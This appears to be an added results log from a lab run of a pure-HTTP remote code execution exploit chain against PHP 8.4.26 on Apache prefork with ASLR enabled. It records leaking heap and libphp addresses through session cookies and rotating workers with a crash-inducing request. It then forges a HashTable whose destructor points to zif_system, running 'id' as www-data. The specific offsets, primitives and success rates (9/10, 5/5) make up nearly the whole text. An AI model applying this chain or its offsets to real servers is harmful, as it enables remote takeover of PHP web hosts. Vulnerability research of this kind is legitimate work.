@@ -1,0 +1,83 @@
+Pure-HTTP ASLR-on chain, 172.16.0.103, PHP 8.4.26 + Apache prefork single worker
+Attack requests: HTTP only. Worker rotation between phases is also HTTP:
+  A_bigfields (1001 fields x 3000B + 12MB OOM) -> session-initializing B
+  -> child exit signal Abort (6) -> prefork respawns a child with the same
+  chunk/libphp mappings.
+Setup/proof only (not part of the attack): restart Apache for a clean master,
+cat /tmp/p1 to read the proof.
+
+Driver: tools/pure_aslr_run.sh
+
+===== Batch A: no initial rotation (fresh master's first child is fresh) =====
+W1=888089 chunk=0x7f712e400000 attempt=1
+W2=888178 libphp=0x7f712fc00000 attempt=1
+W3=888277 HTDATA=0x7f712e46e0d8 ZIF=0x7f713003a870 attempt=1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+W1=888321 chunk=0x7f21d6200000 attempt=1
+W2=888412 libphp=0x7f21d4000000 attempt=1
+W3=888508 HTDATA=0x7f21d626e0d8 ZIF=0x7f21d443a870 attempt=1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+W1=888554 chunk=0x7f0e37800000 attempt=1
+W2=888644 libphp=0x7f0e35600000 attempt=1
+W3=888741 HTDATA=0x7f0e3786e0d8 ZIF=0x7f0e35a3a870 attempt=1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+W1=888787 chunk=0x7fb1bf800000 attempt=1
+W2=888876 libphp=0x7fb1bdc00000 attempt=1
+W3=888974 HTDATA=0x7fb1bf86e0d8 ZIF=0x7fb1be03a870 attempt=1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+W1=889019 chunk=0x7f8f61000000 attempt=1
+W2=889110 libphp=0x7f8f5f400000 attempt=1
+W3=889206 HTDATA=0x7f8f6106e0d8 ZIF=0x7f8f5f83a870 attempt=1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+FULL_PURE_HTTP_OK=5/5
+
+===== Batch B: with initial HTTP rotation (unknown initial worker history) =====
+RUN 1 FAIL (heap leak retries exhausted)
+RUN 2 OK  W1=889767 chunk=0x7f8653800000; W2=889863 libphp=0x7f8654e00000;
+          W3=889961 HTDATA=0x7f865386e0d8 ZIF=0x7f865523a870; PROOF uid=33
+RUN 3 OK  W1=890097 chunk=0x7f7ce1000000; W2=890189 libphp=0x7f7cdf600000;
+          W3=890389 HTDATA=0x7f7ce106e0d8 ZIF=0x7f7cdfa3a870; PROOF uid=33
+          (exploit attempt=2)
+RUN 4 OK  W1=890523 chunk=0x7f9994c00000; W2=890619 libphp=0x7f9993200000;
+          W3=890716 HTDATA=0x7f9994c6e0d8 ZIF=0x7f999363a870; PROOF uid=33
+RUN 5 OK  W1=890853 chunk=0x7fb90c800000; W2=890949 libphp=0x7fb90b000000;
+          W3=891047 HTDATA=0x7fb90c86e0d8 ZIF=0x7fb90b43a870; PROOF uid=33
+RUN 6 OK  W1=891195 chunk=0x7fe29ec00000; W2=891291 libphp=0x7fe29ca00000;
+          W3=891389 HTDATA=0x7fe29ec6e0d8 ZIF=0x7fe29ce3a870; PROOF uid=33
+RUN 7 OK  W1=891525 chunk=0x7fec27600000; W2=891623 libphp=0x7fec25c00000;
+          W3=891719 HTDATA=0x7fec2766e0d8 ZIF=0x7fec2603a870; PROOF uid=33
+RUN 8 OK  W1=891855 chunk=0x7f63aa000000; W2=891953 libphp=0x7f63a7e00000;
+          W3=892049 HTDATA=0x7f63aa06e0d8 ZIF=0x7f63a823a870; PROOF uid=33
+RUN 9 OK  W1=892186 chunk=0x7fd28f400000; W2=892287 libphp=0x7fd290c00000;
+          W3=892382 HTDATA=0x7fd28f46e0d8 ZIF=0x7fd29103a870; PROOF uid=33
+RUN 10 OK W1=892520 chunk=0x7fb791600000; W2=892619 libphp=0x7fb78fc00000;
+          W3=892717 HTDATA=0x7fb79166e0d8 ZIF=0x7fb79003a870; PROOF uid=33
+
+FULL_PURE_HTTP_OK=9/10
+
+===== HTTP rotation primitive, measured separately =====
+fresh worker:        10/10  (A_bigfields -> B -> child exit signal Abort (6))
+after a leak phase:   5/5
+rotation -> leak:     5/5
+
+===== Stage 2 (libphp leak) evidence under ASLR, vs /proc maps =====
+Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%A1%87r%7F%00%00
+decoded: 10 00 00 00 00 00 00 00 | 50 3c a1 87 72 7f 00 00
+pDestructor = 0x7f7287a13c50
+libphp      = 0x7f7287400000      (pDestructor - 0x613c50)
+maps        = 7f7287400000-7f728754f000 r--p ... /usr/lib/apache2/modules/libphp.so
+
+Stage 1 (heap leak) evidence (4096-byte decoded cookie):
+98 candidate 0x7f.... pointers, all 2MB-aligned to the same Zend MM chunk base.
+See logs/http_heap_leak_20261021.txt and .resp.
+
+Stage 3 terminal:
+pDestructor = zif_system = libphp + 0x43a870
+fake HashTable in live 167-byte zend_string at chunk+0x6e0d8
+fake reference raw buffer at R0-0x10, R0 = chunk+0x24e0
+command: id>/tmp/p1  -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
